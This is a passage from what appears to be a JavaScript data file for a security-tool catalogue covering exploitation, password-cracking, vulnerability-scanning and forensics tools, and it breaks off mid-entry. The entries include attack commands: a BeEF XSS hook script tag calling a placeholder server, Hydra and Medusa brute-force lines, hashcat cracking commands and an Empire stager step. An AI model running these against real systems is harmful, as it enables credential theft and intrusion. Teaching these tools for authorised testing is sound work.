      description: "Web application security testing platform with comprehensive testing tools",
      longDescription: "Burp Suite is an integrated platform for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process.",
      category: "Exploitation",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-21",
      officialSite: "https://portswigger.net/burp",
      icon: "🔥",
      whatItIs: "A comprehensive web application security testing platform with proxy, scanner, and exploitation tools.",
      whatItsUsedFor: "Used by security professionals to test web applications for vulnerabilities, manipulate web traffic, and exploit security flaws.",
      howItWorks: "Acts as a proxy between the browser and web application, allowing interception, modification, and analysis of HTTP/HTTPS traffic for security testing.",
      commands: [
        "Start Burp Suite application",
        "Configure browser proxy settings",
        "Intercept and modify requests",
        "Run automated scans"
      ],
      results: [
        "Burp Suite Professional started",
        "Proxy listening on 127.0.0.1:8080",
        "15 vulnerabilities found in scan",
        "SQL injection detected in login form"
      ],
      useCases: [
        "Web application penetration testing",
        "API security testing",
        "Manual security testing",
        "Vulnerability scanning"
      ],
      features: [
        "HTTP/HTTPS proxy",
        "Automated vulnerability scanning",
        "Manual testing tools",
        "Extensibility through plugins",
        "Collaboration features"
      ],
      installSteps: [
        "Download from official website",
        "Install Java Runtime Environment",
        "Run installer package",
        "Configure license (Pro version)"
      ],
      basicUsage: [
        "Start Burp Suite",
        "Configure browser proxy: 127.0.0.1:8080",
        "Browse target application",
        "Analyze intercepted traffic"
      ]
    },
    {
      id: "beef-xss",
      name: "BeEF XSS",
      fullName: "Browser Exploitation Framework - XSS",
      description: "Specialized XSS exploitation and browser hooking framework",
      longDescription: "BeEF XSS is a specialized version focusing on Cross-Site Scripting exploitation and advanced browser-based attacks through JavaScript injection.",
      category: "Exploitation",
      difficulty: "Advanced",
      lastUpdated: "2024-01-16",
      officialSite: "https://beefproject.com",
      icon: "🪝",
      whatItIs: "A specialized framework for exploiting XSS vulnerabilities and conducting browser-based attacks.",
      whatItsUsedFor: "Used to demonstrate the impact of XSS vulnerabilities and conduct advanced client-side exploitation through browser hooking.",
      howItWorks: "Exploits XSS vulnerabilities to inject JavaScript hooks that establish persistent connections with victim browsers for payload execution.",
      commands: [
        "./beef",
        "Insert XSS payload: <script src='http://beef-server:3000/hook.js'></script>",
        "Access hooked browser in control panel",
        "Execute XSS exploitation modules"
      ],
      results: [
        "XSS hook successfully injected",
        "Browser hooked: Firefox on Linux",
        "Credential harvesting module deployed",
        "Session cookies captured"
      ],
      useCases: [
        "XSS vulnerability exploitation",
        "Client-side penetration testing",
        "Browser security assessment",
        "Post-exploitation activities"
      ],
      features: [
        "XSS payload generation",
        "Browser hooking",
        "Real-time browser control",
        "Credential harvesting",
        "Network reconnaissance"
      ],
      installSteps: [
        "Install Ruby and dependencies: sudo apt install ruby-dev",
        "Clone BeEF repository",
        "Install gems: bundle install",
        "Configure for XSS mode"
      ],
      basicUsage: [
        "Start BeEF server",
        "Inject XSS hook into vulnerable page",
        "Monitor hooked browsers",
        "Execute exploitation modules"
      ]
    },
    {
      id: "empire",
      name: "Empire",
      fullName: "PowerShell Empire",
      description: "Post-exploitation framework for Windows environments using PowerShell",
      longDescription: "Empire is a PowerShell and Python post-exploitation agent built on cryptologically-secure communications and a flexible architecture.",
      category: "Exploitation",
      difficulty: "Advanced",
      lastUpdated: "2024-01-17",
      officialSite: "https://github.com/EmpireProject/Empire",
      icon: "👑",
      whatItIs: "A post-exploitation framework specifically designed for Windows environments using PowerShell agents.",
      whatItsUsedFor: "Used in red team operations and penetration testing for maintaining persistence, privilege escalation, and lateral movement in Windows networks.",
      howItWorks: "Uses PowerShell agents that communicate over encrypted channels to provide persistent access and execute various post-exploitation modules.",
      commands: [
        "./empire",
        "listeners",
        "uselistener http",
        "execute"
      ],
      results: [
        "Empire framework started",
        "HTTP listener established on port 80",
        "Agent checked in: DESKTOP-ABC123",
        "Privilege escalation successful"
      ],
      useCases: [
        "Post-exploitation activities",
        "Persistent access maintenance",
        "Lateral movement",
        "Windows environment assessment"
      ],
      features: [
        "PowerShell agents",
        "Encrypted communications",
        "Modular architecture",
        "Persistence mechanisms",
        "Privilege escalation"
      ],
      installSteps: [
        "Clone repository: git clone https://github.com/EmpireProject/Empire",
        "Install dependencies: sudo apt install python3-dev",
        "Run setup: sudo ./setup/install.sh",
        "Start Empire: ./empire"
      ],
      basicUsage: [
        "Start Empire: ./empire",
        "Create listener: uselistener http",
        "Generate payload: usestager windows/launcher_bat",
        "Execute on target and wait for agent"
      ]
    },
    {
      id: "cobalt-strike",
      name: "Cobalt Strike",
      fullName: "Cobalt Strike Adversary Simulation",
      description: "Commercial adversary simulation and red team operations platform",
      longDescription: "Cobalt Strike is a commercial penetration testing tool that is designed to execute targeted attacks and emulate advanced persistent threats.",
      category: "Exploitation",
      difficulty: "Advanced",
      lastUpdated: "2024-01-19",
      officialSite: "https://www.cobaltstrike.com",
      icon: "⚡",
      whatItIs: "A commercial red team and adversary simulation platform for advanced penetration testing.",
      whatItsUsedFor: "Used by red teams and advanced penetration testers to simulate sophisticated attacks and test enterprise security controls.",
      howItWorks: "Provides a collaborative platform with beacon agents, malleable communication profiles, and advanced post-exploitation capabilities.",
      commands: [
        "Start team server",
        "Connect Cobalt Strike client",
        "Generate beacon payloads",
        "Execute lateral movement"
      ],
      results: [
        "Team server started successfully",
        "Beacon session established",
        "Lateral movement to DC completed",
        "Domain admin privileges obtained"
      ],
      useCases: [
        "Red team operations",
        "Advanced persistent threat simulation",
        "Enterprise security testing",
        "Collaborative penetration testing"
      ],
      features: [
        "Beacon agents",
        "Malleable C2 profiles",
        "Collaborative interface",
        "Advanced evasion techniques",
        "Comprehensive reporting"
      ],
      installSteps: [
        "Purchase license from official website",
        "Download client and server components",
        "Install Java Runtime Environment",
        "Configure team server"
      ],
      basicUsage: [
        "Start team server with password",
        "Connect client to team server",
        "Generate and deploy beacons",
        "Execute attack techniques"
      ]
    }
  ],

  "password-cracking": [
    {
      id: "hashcat",
      name: "Hashcat",
      fullName: "Advanced Password Recovery",
      description: "World's fastest and most advanced password recovery utility",
      longDescription: "Hashcat is the world's fastest and most advanced password recovery utility, supporting five unique modes of attack for over 300 highly-optimized hashing algorithms.",
      category: "Password Cracking",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-22",
      officialSite: "https://hashcat.net/hashcat",
      icon: "🔓",
      whatItIs: "A high-performance password cracking tool that uses GPU acceleration for extremely fast hash cracking.",
      whatItsUsedFor: "Used by security professionals to test password strength, recover lost passwords, and assess the security of password storage mechanisms.",
      howItWorks: "Uses various attack modes including dictionary, brute-force, and rule-based attacks with GPU acceleration to crack password hashes at high speeds.",
      commands: [
        "hashcat -m 0 -a 0 hashes.txt wordlist.txt",
        "hashcat -m 1000 -a 3 ntlm.txt ?a?a?a?a?a?a",
        "hashcat -m 22000 capture.hc22000 wordlist.txt",
        "hashcat --show hashes.txt"
      ],
      results: [
        "Session started successfully",
        "Cracked 15/20 hashes (75%)",
        "Password found: admin123",
        "Cracking speed: 1.2 GH/s"
      ],
      useCases: [
        "Password strength testing",
        "Digital forensics investigations",
        "Penetration testing",
        "Security compliance testing"
      ],
      features: [
        "GPU acceleration support",
        "300+ hash algorithm support",
        "Multiple attack modes",
        "Rule-based attacks",
        "Session management"
      ],
      installSteps: [
        "Download from official website",
        "Extract archive: unzip hashcat-6.x.x.zip",
        "Install GPU drivers (NVIDIA/AMD)",
        "Test: ./hashcat.exe --benchmark"
      ],
      basicUsage: [
        "Dictionary attack: hashcat -m [hash_type] -a 0 [hashes] [wordlist]",
        "Brute force: hashcat -m [hash_type] -a 3 [hashes] [mask]",
        "Show cracked: hashcat --show [hashes]",
        "Benchmark: hashcat --benchmark"
      ]
    },
    {
      id: "john-the-ripper",
      name: "John the Ripper",
      fullName: "John the Ripper Password Cracker",
      description: "Fast password cracker with support for many hash types",
      longDescription: "John the Ripper is a free password cracking software tool initially developed for the Unix operating system. It can run on fifteen different platforms including Unix, DOS, Win32, BeOS, and OpenVMS.",
      category: "Password Cracking",
      difficulty: "Beginner",
      lastUpdated: "2024-01-20",
      officialSite: "https://www.openwall.com/john",
      icon: "🔨",
      whatItIs: "A versatile password cracker that can detect hash types and perform dictionary and brute-force attacks.",
      whatItsUsedFor: "Used for password auditing, security testing, and recovering passwords from various hash formats found in system files.",
      howItWorks: "Automatically detects hash types and applies appropriate cracking methods including dictionary attacks, rule-based attacks, and brute force.",
      commands: [
        "john --wordlist=wordlist.txt hashes.txt",
        "john --incremental hashes.txt",
        "john --show hashes.txt",
        "john --format=raw-md5 md5hashes.txt"
      ],
      results: [
        "Loaded 10 password hashes",
        "Using default input encoding: UTF-8",
        "password123 (user1)",
        "admin (administrator)"
      ],
      useCases: [
        "Password auditing",
        "System security testing",
        "Digital forensics",
        "Compliance verification"
      ],
      features: [
        "Automatic hash detection",
        "Multiple attack modes",
        "Custom rule creation",
        "Multi-platform support",
        "Distributed cracking"
      ],
      installSteps: [
        "Install: sudo apt install john",
        "Verify installation: john --test",
        "Download wordlists: sudo apt install wordlists",
        "Test with sample: john /etc/shadow"
      ],
      basicUsage: [
        "Dictionary attack: john --wordlist=[wordlist] [hashes]",
        "Brute force: john --incremental [hashes]",
        "Show results: john --show [hashes]",
        "Specific format: john --format=[type] [hashes]"
      ]
    },
    {
      id: "hydra",
      name: "Hydra",
      fullName: "THC Hydra Login Cracker",
      description: "Parallelized login cracker supporting numerous protocols",
      longDescription: "Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add.",
      category: "Password Cracking",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-18",
      officialSite: "https://github.com/vanhauser-thc/thc-hydra",
      icon: "🐍",
      whatItIs: "A network login cracker that performs brute-force attacks against various network services.",
      whatItsUsedFor: "Used to test the security of network services by attempting to crack login credentials through brute-force and dictionary attacks.",
      howItWorks: "Performs parallelized brute-force attacks against network services like SSH, FTP, HTTP, and many others using wordlists and credential combinations.",
      commands: [
        "hydra -l admin -P passwords.txt ssh://192.168.1.1",
        "hydra -L users.txt -P passwords.txt ftp://192.168.1.1",
        "hydra -l admin -p admin http-get://192.168.1.1/admin",
        "hydra -C credentials.txt ssh://192.168.1.1"
      ],
      results: [
        "Starting Hydra v9.4",
        "[SSH] host: 192.168.1.1 login: admin password: password123",
        "1 of 1 target successfully completed",
        "Attack completed in 2.5 minutes"
      ],
      useCases: [
        "Network service security testing",
        "Credential brute-forcing",
        "Authentication bypass testing",
        "Security compliance verification"
      ],
      features: [
        "Support for 50+ protocols",
        "Parallelized attacks",
        "Custom wordlist support",
        "Session resume capability",
        "Module extensibility"
      ],
      installSteps: [
        "Install: sudo apt install hydra",
        "Verify: hydra -h",
        "Download wordlists: wget SecLists",
        "Test connection: hydra -L users.txt -P pass.txt [target] [service]"
      ],
      basicUsage: [
        "Single user: hydra -l [user] -P [passlist] [target] [service]",
        "User list: hydra -L [userlist] -P [passlist] [target] [service]",
        "Combo list: hydra -C [combo.txt] [target] [service]",
        "HTTP form: hydra -L users.txt -P pass.txt [target] http-post-form"
      ]
    },
    {
      id: "medusa",
      name: "Medusa",
      fullName: "Medusa Parallel Login Brute-Forcer",
      description: "Speedy, parallel, and modular login brute-forcer",
      longDescription: "Medusa is intended to be a speedy, massively parallel, modular, login brute-forcer. The goal is to support as many services which allow remote authentication as possible.",
      category: "Password Cracking",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-16",
      officialSite: "http://foofus.net/goons/jmk/medusa/medusa.html",
      icon: "🏛️",
      whatItIs: "A parallel network login brute-forcer with modular architecture for testing various authentication services.",
      whatItsUsedFor: "Used for testing password strength of network services and identifying weak authentication mechanisms in penetration testing.",
      howItWorks: "Uses a modular approach to perform parallel brute-force attacks against network authentication services with customizable threading and timing options.",
      commands: [
        "medusa -h 192.168.1.1 -u admin -P passwords.txt -M ssh",
        "medusa -H hosts.txt -U users.txt -P passwords.txt -M ftp",
        "medusa -h 192.168.1.1 -U users.txt -p password -M telnet",
        "medusa -C combo.txt -h 192.168.1.1 -M http"
      ],
      results: [
        "Medusa v2.2 [http://www.foofus.net]",
        "ACCOUNT FOUND: [ssh] Host: 192.168.1.1 User: admin Password: admin123",
        "Success rate: 1/100 (1%)",
        "Timing: Real: 45.2s User: 2.1s System: 1.8s"
      ],
      useCases: [
        "Network authentication testing",
        "Password policy verification",
        "Service security assessment",
        "Parallel credential testing"
      ],
      features: [
        "Parallel processing",
        "Modular service support",
        "Flexible authentication options",
        "Resume capability",
        "Multiple output formats"
      ],
      installSteps: [
        "Install: sudo apt install medusa",
        "Check modules: medusa -d",
        "Verify installation: medusa -h",
        "Test with service: medusa -h [target] -M [module]"
      ],
      basicUsage: [
        "Basic attack: medusa -h [host] -u [user] -P [passlist] -M [module]",
        "Multiple hosts: medusa -H [hostlist] -u [user] -P [passlist] -M [module]",
        "Combo attack: medusa -C [combo.txt] -h [host] -M [module]",
        "Threaded: medusa -h [host] -u [user] -P [passlist] -M [module] -t 20"
      ]
    },
    {
      id: "ophcrack",
      name: "Ophcrack",
      fullName: "Windows Password Cracker",
      description: "Windows password cracker based on rainbow tables",
      longDescription: "Ophcrack is a free Windows password cracker based on rainbow tables. It is efficient implementation of rainbow tables done by the inventors of the method.",
      category: "Password Cracking",
      difficulty: "Beginner",
      lastUpdated: "2024-01-14",
      officialSite: "http://ophcrack.sourceforge.net",
      icon: "🌈",
      whatItIs: "A Windows password cracker that uses precomputed rainbow tables for extremely fast password recovery.",
      whatItsUsedFor: "Used for recovering Windows user passwords, particularly useful in digital forensics and password recovery scenarios.",
      howItWorks: "Uses precomputed rainbow tables to perform time-memory trade-off attacks, making password cracking much faster than traditional brute-force methods.",
      commands: [
        "Launch Ophcrack GUI",
        "Load SAM database",
        "Install rainbow tables",
        "Start cracking process"
      ],
      results: [
        "SAM database loaded successfully",
        "Rainbow tables installed: Vista/7 special",
        "Password found: user1 -> password123",
        "Cracking completed in 2 minutes"
      ],
      useCases: [
        "Windows password recovery",
        "Digital forensics investigations",
        "System administrator password reset",
        "Security awareness demonstrations"
      ],
      features: [
        "Rainbow table support",
        "Graphical user interface",
        "Live CD available",
        "Multiple hash types",
        "Automatic SAM extraction"
      ],
      installSteps: [
        "Download from official website",
        "Install application package",
        "Download rainbow tables",
        "Extract SAM file from Windows system"
      ],
      basicUsage: [
        "Launch Ophcrack application",
        "Load -> Single hash or SAM file",
        "Install appropriate rainbow tables",
        "Click 'Crack' to start process"
      ]
    },
    {
      id: "crunch",
      name: "Crunch",
      fullName: "Wordlist Generator",
      description: "Wordlist generator for creating custom password lists",
      longDescription: "Crunch is a wordlist generator where you can specify a standard character set or a character set you specify. Crunch can generate all possible combinations and permutations.",
      category: "Password Cracking",
      difficulty: "Beginner",
      lastUpdated: "2024-01-12",
      officialSite: "https://sourceforge.net/projects/crunch-wordlist",
      icon: "📝",
      whatItIs: "A highly configurable wordlist generator for creating custom password dictionaries.",
      whatItsUsedFor: "Used to generate targeted wordlists for password cracking based on known information about the target or password policies.",
      howItWorks: "Generates wordlists based on specified character sets, lengths, and patterns, allowing for highly targeted password dictionary creation.",
      commands: [
        "crunch 8 8 0123456789 -o numbers.txt",
        "crunch 6 10 abcdefghijklmnopqrstuvwxyz",
        "crunch 4 6 -f charset.lst mixalpha-numeric",
        "crunch 8 8 -t @@@@2024"
      ],
      results: [
        "Generating wordlist...",
        "Wordlist created: numbers.txt",
        "Generated 100,000,000 passwords",
        "File size: 900MB"
      ],
      useCases: [
        "Custom wordlist generation",
        "Targeted password attacks",
        "Policy-based dictionary creation",
        "Penetration testing preparation"
      ],
      features: [
        "Custom character sets",
        "Pattern-based generation",
        "Large file support",
        "Resume capability",
        "Multiple output formats"
      ],
      installSteps: [
        "Install: sudo apt install crunch",
        "Verify: crunch --help",
        "Check character sets: ls /usr/share/crunch/charset.lst",
        "Test generation: crunch 4 4 abcd"
      ],
      basicUsage: [
        "Basic: crunch [min] [max] [charset]",
        "Pattern: crunch [min] [max] -t [pattern]",
        "Output file: crunch [min] [max] [charset] -o [file]",
        "Character file: crunch [min] [max] -f [charset_file] [name]"
      ]
    }
  ],

  "vulnerability-scanning": [
    {
      id: "nessus",
      name: "Nessus",
      fullName: "Nessus Vulnerability Scanner",
      description: "Comprehensive vulnerability scanner for identifying security flaws",
      longDescription: "Nessus is a remote security scanning tool, which scans a computer and raises an alert if it discovers any vulnerabilities that malicious hackers could use to gain access.",
      category: "Vulnerability Scanning",
      difficulty: "Beginner",
      lastUpdated: "2024-01-23",
      officialSite: "https://www.tenable.com/products/nessus",
      icon: "🔍",
      whatItIs: "A comprehensive vulnerability scanner that identifies security flaws in networks, systems, and applications.",
      whatItsUsedFor: "Used by security professionals to conduct vulnerability assessments, compliance checking, and security auditing of IT infrastructure.",
      howItWorks: "Performs remote and local security checks using an extensive database of vulnerability tests and plugins to identify potential security issues.",
      commands: [
        "Access web interface: https://localhost:8834",
        "Create new scan policy",
        "Configure scan targets",
        "Launch vulnerability scan"
      ],
      results: [
        "Nessus scan completed successfully",
        "Found 25 vulnerabilities (5 Critical, 8 High, 12 Medium)",
        "Generated comprehensive report",
        "Identified missing security patches"
      ],
      useCases: [
        "Vulnerability assessment",
        "Compliance scanning",
        "Security auditing",
        "Patch management"
      ],
      features: [
        "Comprehensive vulnerability database",
        "Web-based interface",
        "Compliance templates",
        "Custom policy creation",
        "Detailed reporting"
      ],
      installSteps: [
        "Download from Tenable website",
        "Install package: sudo dpkg -i Nessus.deb",
        "Start service: sudo systemctl start nessusd",
        "Access web UI: https://localhost:8834"
      ],
      basicUsage: [
        "Access web interface",
        "Create scan policy",
        "Add target hosts/networks",
        "Launch scan and review results"
      ]
    },
    {
      id: "openvas",
      name: "OpenVAS",
      fullName: "Open Vulnerability Assessment Scanner",
      description: "Open-source vulnerability scanner and management solution",
      longDescription: "OpenVAS is a full-featured vulnerability scanner. Its capabilities include unauthenticated testing, authenticated testing, various high level and low level Internet and industrial protocols.",
      category: "Vulnerability Scanning",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-21",
      officialSite: "https://www.openvas.org",
      icon: "🛡️",
      whatItIs: "An open-source vulnerability assessment platform providing comprehensive security scanning capabilities.",
      whatItsUsedFor: "Used for identifying vulnerabilities in networks and systems, providing detailed security assessments for organizations.",
      howItWorks: "Uses a client-server architecture with a comprehensive vulnerability database to perform authenticated and unauthenticated security tests.",
      commands: [
        "gvm-setup",
        "gvm-start",
        "gvm-feed-update",
        "Access web interface: https://localhost:9392"
      ],
      results: [
        "OpenVAS setup completed",
        "Vulnerability feeds updated",
        "Scan completed: 45 vulnerabilities found",
        "Report generated with remediation steps"
      ],
      useCases: [
        "Network vulnerability assessment",
        "Continuous security monitoring",
        "Compliance reporting",
        "Risk management"
      ],
      features: [
        "Comprehensive scan engine",
        "Web-based management interface",
        "Vulnerability feed updates",
        "Custom report generation",
        "API integration"
      ],
      installSteps: [
        "Install dependencies: sudo apt install postgresql",
        "Install OpenVAS: sudo apt install openvas",
        "Setup: sudo gvm-setup",
        "Start services: sudo gvm-start"
      ],
      basicUsage: [
        "Setup OpenVAS: gvm-setup",
        "Start services: gvm-start",
        "Access web UI: https://localhost:9392",
        "Create and run scans"
      ]
    },
    {
      id: "nikto",
      name: "Nikto",
      fullName: "Nikto Web Server Scanner",
      description: "Web server scanner for identifying potential vulnerabilities",
      longDescription: "Nikto is an Open Source web server scanner which performs comprehensive tests against web servers for multiple items including dangerous files/programs.",
      category: "Vulnerability Scanning",
      difficulty: "Beginner",
      lastUpdated: "2024-01-19",
      officialSite: "https://cirt.net/Nikto2",
      icon: "🌐",
      whatItIs: "A web server scanner that tests for thousands of potentially dangerous files, programs, and server configurations.",
      whatItsUsedFor: "Used to identify security issues in web servers, including outdated software, dangerous files, and configuration problems.",
      howItWorks: "Performs comprehensive tests against web servers by checking for known vulnerabilities, misconfigurations, and dangerous files.",
      commands: [
        "nikto -h http://example.com",
        "nikto -h 192.168.1.1 -p 80,443",
        "nikto -h http://example.com -o report.html",
        "nikto -h http://example.com -evasion 1"
      ],
      results: [
        "Nikto v2.1.6 scan initiated",
        "Target: http://example.com:80",
        "Found 15 potential vulnerabilities",
        "Scan completed in 2 minutes"
      ],
      useCases: [
        "Web server security assessment",
        "Configuration review",
        "Vulnerability identification",
        "Compliance checking"
      ],
      features: [
        "Comprehensive vulnerability database",
        "Multiple output formats",
        "SSL support",
        "Proxy support",
        "Evasion techniques"
      ],
      installSteps: [
        "Install: sudo apt install nikto",
        "Update database: nikto -update",
        "Verify installation: nikto -h",
        "Test scan: nikto -h http://example.com"
      ],
      basicUsage: [
        "Basic scan: nikto -h [target]",
        "Multiple ports: nikto -h [target] -p [ports]",
        "Output file: nikto -h [target] -o [file]",
        "SSL scan: nikto -h https://[target]"
      ]
    },
    {
      id: "nuclei",
      name: "Nuclei",
      fullName: "Nuclei Vulnerability Scanner",
      description: "Fast vulnerability scanner with template-based scanning",
      longDescription: "Nuclei is used to send requests across targets based on a template leading to zero false positives and providing fast scanning on large number of hosts.",
      category: "Vulnerability Scanning",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-24",
      officialSite: "https://nuclei.projectdiscovery.io",
      icon: "⚛️",
      whatItIs: "A modern vulnerability scanner that uses YAML-based templates for fast and accurate security testing.",
      whatItsUsedFor: "Used for automated vulnerability discovery across large-scale infrastructure with minimal false positives.",
      howItWorks: "Uses community-driven templates written in YAML to perform targeted vulnerability scans with high accuracy and speed.",
      commands: [
        "nuclei -u https://example.com",
        "nuclei -l targets.txt -t cves/",
        "nuclei -u https://example.com -severity critical,high",
        "nuclei -u https://example.com -o results.txt"
      ],
      results: [
        "Nuclei v2.8.0 scan started",
        "Templates loaded: 4,567",
        "Found vulnerability: CVE-2021-44228 (Log4j)",
        "Scan completed: 5 vulnerabilities found"
      ],
      useCases: [
        "Continuous security monitoring",
        "Large-scale vulnerability scanning",
        "Bug bounty hunting",
        "CI/CD security integration"
      ],
      features: [
        "Template-based scanning",
        "Community-driven templates",
        "Fast parallel execution",
        "Zero false positives",
        "Custom template creation"
      ],
      installSteps: [
        "Download binary from GitHub releases",
        "Install: wget -O nuclei https://github.com/projectdiscovery/nuclei/releases/download/v2.8.0/nuclei_2.8.0_linux_amd64.tar.gz",
        "Extract and install: tar -xzf nuclei*.tar.gz && sudo mv nuclei /usr/local/bin/",
        "Update templates: nuclei -update-templates"
      ],
      basicUsage: [
        "Single target: nuclei -u [URL]",
        "Multiple targets: nuclei -l [file]",
        "Specific templates: nuclei -u [URL] -t [template]",
        "Severity filter: nuclei -u [URL] -severity [level]"
      ]
    },
    {
      id: "wpscan",
      name: "WPScan",
      fullName: "WordPress Security Scanner",
      description: "Black box WordPress vulnerability scanner",
      longDescription: "WPScan is a free, for non-commercial use, black box WordPress vulnerability scanner written for security professionals and blog maintainers to test the security of their WordPress websites.",
      category: "Vulnerability Scanning",
      difficulty: "Beginner",
      lastUpdated: "2024-01-17",
      officialSite: "https://wpscan.com",
      icon: "📝",
      whatItIs: "A specialized vulnerability scanner designed specifically for WordPress websites and applications.",
      whatItsUsedFor: "Used to identify security vulnerabilities in WordPress sites, including plugin vulnerabilities, theme issues, and configuration problems.",
      howItWorks: "Performs enumeration and vulnerability detection specific to WordPress installations, checking plugins, themes, users, and core files.",
      commands: [
        "wpscan --url https://example.com",
        "wpscan --url https://example.com --enumerate u",
        "wpscan --url https://example.com --enumerate p,t,u",
        "wpscan --url https://example.com --passwords passwords.txt"
      ],
      results: [
        "WordPress version 5.9.3 identified",
        "Found 3 vulnerable plugins",
        "Enumerated 5 users",
        "Identified outdated theme"
      ],
      useCases: [
        "WordPress security assessment",
        "Plugin vulnerability scanning",
        "User enumeration",
        "Brute force testing"
      ],
      features: [
        "WordPress-specific scanning",
        "Plugin/theme enumeration",
        "User enumeration",
        "Brute force capabilities",
        "Vulnerability database integration"
      ],
      installSteps: [
        "Install Ruby: sudo apt install ruby-dev",
        "Install WPScan: gem install wpscan",
        "Update database: wpscan --update",
        "Test scan: wpscan --url [WordPress_site]"
      ],
      basicUsage: [
        "Basic scan: wpscan --url [URL]",
        "Enumerate plugins: wpscan --url [URL] --enumerate p",
        "Enumerate users: wpscan --url [URL] --enumerate u",
        "Brute force: wpscan --url [URL] --usernames [user] --passwords [list]"
      ]
    },
    {
      id: "lynis",
      name: "Lynis",
      fullName: "Lynis Security Auditing Tool",
      description: "Security auditing tool for Unix/Linux systems",
      longDescription: "Lynis is a security auditing tool for Unix/Linux systems. It performs an extensive health scan of your systems to support system hardening and compliance testing.",
      category: "Vulnerability Scanning",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-20",
      officialSite: "https://cisofy.com/lynis",
      icon: "🔒",
      whatItIs: "A comprehensive security auditing tool that performs system hardening and compliance checks on Unix/Linux systems.",
      whatItsUsedFor: "Used for security auditing, system hardening, penetration testing, and compliance checking of Linux/Unix systems.",
      howItWorks: "Performs hundreds of individual tests to check system configuration, installed software, and security settings against best practices.",
      commands: [
        "sudo lynis audit system",
        "lynis show profiles",
        "lynis show tests",
        "lynis audit system --profile /path/to/profile"
      ],
      results: [
        "Lynis 3.0.8 security audit started",
        "System scan completed",
        "Hardening index: 72/100",
        "Found 15 warnings, 8 suggestions"
      ],
      useCases: [
        "System security auditing",
        "Compliance checking",
        "System hardening",
        "Penetration testing"
      ],
      features: [
        "Comprehensive system scanning",
        "Compliance framework support",
        "Custom profiles",
        "Detailed reporting",
        "Integration capabilities"
      ],
      installSteps: [
        "Install: sudo apt install lynis",
        "Update: sudo lynis update info",
        "Check version: lynis --version",
        "Run audit: sudo lynis audit system"
      ],
      basicUsage: [
        "Full audit: sudo lynis audit system",
        "Quick audit: sudo lynis audit system --quick",
        "Show tests: lynis show tests",
        "Custom profile: lynis audit system --profile [profile]"
      ]
    }
  ],

  "forensics": [
    {
      id: "autopsy",
      name: "Autopsy",
      fullName: "Autopsy Digital Forensics Platform",
      description: "Digital forensics platform and GUI for The Sleuth Kit",
      longDescription: "Autopsy is a digital forensics platform and graphical interface to The Sleuth Kit and other digital forensics tools. It can be used to investigate what happened on a computer.",
      category: "Forensics",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-25",
      officialSite: "https://www.autopsy.com",
      icon: "🔍",
      whatItIs: "A comprehensive digital forensics platform for investigating digital evidence from computers and mobile devices.",
      whatItsUsedFor: "Used by digital forensics investigators to analyze disk images, recover deleted files, and investigate cybercrime incidents.",
      howItWorks: "Provides a graphical interface for examining disk images, file systems, and extracting digital evidence from various storage devices.",
      commands: [
        "Launch Autopsy GUI",
        "Create new case",
        "Add disk image data source",
        "Run ingest modules for analysis"
      ],
      results: [
        "Case created successfully",
        "Disk image loaded: evidence.dd",
        "Found 1,250 deleted files",
        "Identified 45 web artifacts"
      ],
      useCases: [
        "Criminal investigations",
        "Corporate incident response",
        "Data recovery",
        "Cybercrime analysis"
      ],
      features: [
        "Graphical user interface",
        "Timeline analysis",
        "Keyword searching",
        "File carving",
        "Report generation"
      ],
      installSteps: [
        "Download from official website",
        "Install Java Runtime Environment",
        "Install Autopsy package",
        "Launch application and create case"
      ],
      basicUsage: [
        "Launch Autopsy",
        "Create new case",
        "Add data source (disk image)",
        "Configure and run analysis modules"
      ]
    },
    {
      id: "volatility",
      name: "Volatility",
      fullName: "Volatility Memory Forensics Framework",
      description: "Advanced memory forensics framework for incident response and malware analysis",
      longDescription: "Volatility is an open source memory forensics framework for incident response and malware analysis. It is written in Python and supports Microsoft Windows, Mac OS X, and Linux.",
      category: "Forensics",
      difficulty: "Advanced",
      lastUpdated: "2024-01-22",
      officialSite: "https://www.volatilityfoundation.org",
      icon: "🧠",
      whatItIs: "A memory forensics framework for analyzing RAM dumps and extracting digital artifacts from memory.",
      whatItsUsedFor: "Used for malware analysis, incident response, and extracting evidence from computer memory dumps.",
      howItWorks: "Analyzes memory dumps to reconstruct the system state, identify running processes, network connections, and extract digital artifacts.",
      commands: [
        "volatility -f memory.dmp imageinfo",
        "volatility -f memory.dmp --profile=Win7SP1x64 pslist",
        "volatility -f memory.dmp --profile=Win7SP1x64 netscan",
        "volatility -f memory.dmp --profile=Win7SP1x64 malfind"
      ],
      results: [
        "Memory profile identified: Win7SP1x64",
        "Found 45 running processes",
        "Detected suspicious process: malware.exe",
        "Extracted network connections"
      ],
      useCases: [
        "Malware analysis",
        "Incident response",
        "Digital forensics",
        "Security research"
      ],
      features: [
        "Cross-platform support",
        "Extensive plugin architecture",
        "Process analysis",
        "Network artifact extraction",
        "Malware detection"
      ],
      installSteps: [
        "Install Python 2.7: sudo apt install python2.7",
        "Clone repository: git clone https://github.com/volatilityfoundation/volatility.git",
        "Install dependencies: pip install pycrypto distorm3",
        "Run: python vol.py --help"
      ],
      basicUsage: [
        "Get image info: volatility -f [dump] imageinfo",
        "List processes: volatility -f [dump] --profile=[profile] pslist",
        "Network scan: volatility -f [dump] --profile=[profile] netscan",
        "Find malware: volatility -f [dump] --profile=[profile] malfind"
      ]
    },
    {
      id: "binwalk",
      name: "Binwalk",
      fullName: "Binwalk Firmware Analysis Tool",
      description: "Tool for analyzing, reverse engineering, and extracting firmware images",
      longDescription: "Binwalk is a fast, easy to use tool for analyzing, reverse engineering, and extracting firmware images. It is designed specifically to identify files and code embedded inside of firmware images.",
      category: "Forensics",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-18",
      officialSite: "https://github.com/ReFirmLabs/binwalk",
      icon: "🔧",
      whatItIs: "A firmware analysis tool for identifying and extracting embedded files and code from firmware images.",
      whatItsUsedFor: "Used for reverse engineering firmware, IoT security research, and extracting embedded files from binary images.",
      howItWorks: "Uses signature scanning to identify file systems, compressed archives, and executable code within firmware images.",
      commands: [
        "binwalk firmware.bin",
        "binwalk -e firmware.bin",
        "binwalk -A firmware.bin",
